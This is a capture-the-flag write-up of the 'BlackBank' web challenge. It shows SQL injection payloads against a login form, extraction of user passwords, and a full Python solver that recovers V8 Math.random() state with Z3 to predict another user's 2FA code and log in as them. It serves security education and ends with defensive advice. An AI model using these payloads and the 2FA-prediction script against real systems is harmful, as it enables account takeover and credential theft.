# BlackBank - Midnight Flag CTF 2026 EXECUTION

**Category:** Web2
**Flag:** `MCTF{v8_1s_n0t_SEcur3_4t_4l7}`

---

## Overview

BlackBank is a web challenge simulating a criminal banking platform with two services: a **bank** (login + 2FA + dashboard) and a **mail** system (BlackMail). We're given credentials for a low-level member, and the goal is to access the boss's dashboard where the flag is displayed.

The core vulnerability is that the server uses **V8's `Math.random()`** (xorshift128+) to generate 2FA codes. By observing enough codes from our own account, we can **recover the PRNG internal state** and **predict** the 2FA code for any other user.

---

## Recon

The challenge description gives us:
- **URL:** `http://dyn-03.midnightflag.fr:<port>`
- **Credentials:** `katarina:Kathax0r_sk1d0s`
- Katarina is a member of a criminal group that stole 3,500 BTC

Navigating to the site, we find two apps:
- `/bank/login` — Bank login with 2FA
- `/mail/login` — Mail system (BlackMail)

Logging in as katarina on the bank redirects to `/bank/2fa`, which requires a code sent to her mail. Logging into the mail with the same credentials reveals the 2FA code. After submitting it, we land on `/bank/profile` — katarina's dashboard showing a chat with **Vladizlow** (the boss). The flag area is **empty** for katarina.

---

## Step 1: SQL Injection on Bank Login

The `/bank/login` endpoint is vulnerable to SQL injection in the `username` field. Testing with:

```
username: ' OR 1=1--
password: anything
```

confirms the injection. Using UNION-based injection, I enumerated the database:

```
' UNION SELECT null,null,null,null--    → 401 (4 columns, valid query)
' UNION SELECT null,null,null,null,null-- → 500 (too many columns)
```

**4 columns.** Using boolean-based blind SQLi, I extracted the schema:

```sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL,
    emailUser TEXT NOT NULL
)
```

And the data:

| id | username   | password              | emailUser |
|----|------------|-----------------------|-----------|
| 1  | katarina   | Kathax0r_sk1d0s       | katarina  |
| 2  | Vladizlow  | xeAgQ8dJcc0hUVCm2EV9  | admin     |

The `emailUser` column determines **which mail account receives the 2FA code**. Vladizlow's codes go to the `admin` mail account, which we can't access.

---

## Step 2: Understanding the 2FA Flow

The authentication flow:

1. `POST /bank/login` — validates credentials via SQLi-vulnerable query, stores user in session, generates 2FA code, sends it to the user's `emailUser` mail account
2. `POST /bank/2fa` — validates the submitted code against the session's stored code
3. `GET /bank/profile` — renders the dashboard (flag only visible for Vladizlow)

I tried many approaches to bypass 2FA:
- **UNION injection** to change `emailUser` → ignored; the server re-queries the DB by username
- **Session confusion** (login as katarina, verify 2FA, re-login as Vladizlow) → 2FA state resets on re-login
- **Parameter tampering** on `/bank/2fa`, `/bank/resend`, `/bank/profile` → no effect
- **Brute force** → 8-digit codes, 30s validity, ~570 req/s = impossible
- **Admin mail password guessing** → tried thousands of passwords, none worked

The key observation: the 2FA codes are **7-8 digit numbers** that look like `Math.floor(Math.random() * 100000000)`. V8's `Math.random()` uses **xorshift128+**, which is **not cryptographically secure** and can be predicted if you observe enough outputs.

---

## Step 3: V8 Math.random() State Recovery

### Background

Node.js uses the V8 JavaScript engine. V8's `Math.random()` is implemented as **xorshift128+** with a **64-value LIFO cache**:

1. V8 generates 64 random doubles at once and stores them in a cache
2. Each call to `Math.random()` pops from the **end** of the cache (LIFO)
3. When the cache is empty, it refills with 64 new values

The xorshift128+ PRNG has a 128-bit internal state `(state0, state1)`. Given enough observed outputs, the state can be recovered using a **Z3 SMT solver**, and all future outputs can be predicted.

The conversion from state to output is:

```javascript
// V8 internal: generate double from state0
Math.random() = (state0 >> 12) / 2**52   // value in [0, 1)

// The app generates codes as:
code = Math.floor(100000000 * Math.random())
```

Since `Math.floor()` discards fractional bits, we lose some precision per observation. The solver needs **~5-10 codes from a single cache segment** to uniquely recover the state.

### Key Insight: LIFO Reversal

Because V8 serves cached values in **reverse order** (LIFO), the codes we observe in chronological order must be **reversed** before feeding them into the xorshift128+ forward solver. The solver from `predict_decimal_v8.py` handles this automatically:

```python
# From the solver: reverse observed codes for LIFO cache
for code in reversed(codes):
    cur_s0, cur_s1 = xorshift128_step_bv(cur_s0, cur_s1)
    mantissa = z3.LShR(cur_s0, 12)
    # ... constrain mantissa to match observed code
```

### Resources

- [PwnFunction/v8-randomness-predictor](https://github.com/PwnFunction/v8-randomness-predictor) — Z3-based Math.random predictor
- [d0nutptr/v8_rand_buster](https://github.com/d0nutptr/v8_rand_buster) — handles `Math.floor(MULTIPLE * Math.random())`
- [StroppaFR/mathrandomcrack](https://github.com/StroppaFR/mathrandomcrack) — Sage-based cracker supporting non-consecutive outputs
- [V8 blog: Math.random()](https://v8.dev/blog/math-random) — official documentation of the implementation

---

## Step 4: Collecting Codes

The critical requirement is that all observed codes come from a **single cache segment** — meaning they must be consecutive xorshift128+ outputs from the same cache fill. This is achieved by using a **single session** and rapidly calling resend:

```python
import requests, re, time

BASE = "http://dyn-03.midnightflag.fr:13200"

# Login to mail to read codes
sm = requests.Session()
sm.post(f"{BASE}/mail/login", data={
    "username": "katarina", "password": "Kathax0r_sk1d0s"
})

# Single bank session — all codes come from one cache segment
s = requests.Session()
s.post(f"{BASE}/bank/login", data={
    "username": "katarina", "password": "Kathax0r_sk1d0s"
})

codes = []
for i in range(10):
    s.post(f"{BASE}/bank/resend")
    time.sleep(0.3)
    top = re.findall(r'⚡ (\d+)', sm.get(f"{BASE}/mail/inbox").text)
    if top and (not codes or top[0] != codes[-1]):
        codes.append(top[0])

print(f"Collected {len(codes)} codes: {codes}")
```

Output:
```
Collected 10 codes: ['19368238', '13611877', '24411298', '66357597',
'25991259', '85264482', '63657524', '43659187', '70329421', '80332196']
```

---

## Step 5: Recovering State and Predicting the 2FA Code

Using the `predict_decimal_v8.py` solver with the collected codes:

```bash
python3 predict_decimal_v8.py \
  --const 100000000 \
  --codes "19368238,13611877,24411298,66357597,25991259,85264482,63657524,43659187,70329421,80332196" \
  --predict 30
```

Output:
```
[+] const=100000000 observations=10 width=8
[+] recovered 1 candidate(s)
[+] candidate 1: init_s0=0xad1527a9711f24d9 init_s1=0xcda6822cd30a7592
    next: ['67610404', '31378593', '63882951', ...]
```

The solver recovered a **unique** xorshift128+ state and predicted the next 30 codes. The first prediction is `67610404`.

---

## Step 6: Submitting the Predicted Code

With the predicted code, I logged in as Vladizlow and submitted it:

```python
# Login as Vladizlow
sv = requests.Session()
sv.post(f"{BASE}/bank/login", data={
    "username": "Vladizlow", "password": "xeAgQ8dJcc0hUVCm2EV9"
})

# Submit predicted 2FA code
r = sv.post(f"{BASE}/bank/2fa", data={"code": "67610404"}, allow_redirects=False)
print(f"2FA: {r.status_code} -> {r.headers.get('Location')}")
# 2FA: 302 -> /bank/profile

# Get the flag
profile = sv.get(f"{BASE}/bank/profile").text
flag = re.findall(r'MCTF\{[^}]+\}', profile)
print(f"FLAG: {flag}")
# FLAG: ['MCTF{v8_1s_n0t_SEcur3_4t_4l7}']
```

---

## Full Solver

```python
#!/usr/bin/env python3
"""BlackBank solver — predict Vladizlow's 2FA via V8 Math.random() state recovery"""

import requests, re, time, subprocess, json, sys

BASE = sys.argv[1]  # e.g. http://dyn-03.midnightflag.fr:13200
PREDICTOR = "predict_decimal_v8.py"  # path to the V8 predictor script

# 1. Login to mail
sm = requests.Session()
sm.post(f"{BASE}/mail/login", data={"username":"katarina","password":"Kathax0r_sk1d0s"})

# 2. Collect 10 codes from a single bank session
s = requests.Session()
s.post(f"{BASE}/bank/login", data={"username":"katarina","password":"Kathax0r_sk1d0s"})

codes = []
for _ in range(10):
    s.post(f"{BASE}/bank/resend")
    time.sleep(0.3)
    top = re.findall(r'⚡ (\d+)', sm.get(f"{BASE}/mail/inbox").text)
    if top and (not codes or top[0] != codes[-1]):
        codes.append(top[0])

print(f"[*] Collected {len(codes)} codes")

# 3. Predict next codes using V8 xorshift128+ state recovery
result = subprocess.run(
    ["python3", PREDICTOR, "--const", "100000000",
     "--codes", ",".join(codes), "--predict", "30",
     "--timeout-ms", "30000", "--models", "64"],
    capture_output=True, text=True
)
print(result.stdout)

# 4. Parse predictions
predictions = set()
for line in result.stdout.split("\n"):
    if "next:" in line:
        predictions.update(re.findall(r"'(\d+)'", line))

# 5. Login as Vladizlow and try predicted codes
sv = requests.Session()
sv.post(f"{BASE}/bank/login", data={"username":"Vladizlow","password":"xeAgQ8dJcc0hUVCm2EV9"})

for pred in predictions:
    r = sv.post(f"{BASE}/bank/2fa", data={"code": pred}, allow_redirects=False)
    if r.status_code == 302:
        profile = sv.get(f"{BASE}/bank/profile").text
        flag = re.findall(r'MCTF\{[^}]+\}', profile)
        print(f"[!!!] FLAG: {flag[0]}")
        break
```

---

## Takeaways

- **Never use `Math.random()` for security-sensitive operations.** V8's xorshift128+ is fast but trivially predictable. Use `crypto.randomInt()` or `crypto.getRandomValues()` instead.
- The V8 PRNG has a **64-value LIFO cache** that must be accounted for when modeling the output sequence — observed codes must be reversed before solving.
- With `Math.floor(CONST * Math.random())`, roughly **5-10 observed outputs** from a single cache segment are enough to uniquely recover the 128-bit internal state via Z3.
- SQL injection gave us the target user's credentials and the database schema, but the real exploit chain was **SQLi → credential extraction → PRNG state recovery → 2FA bypass**.
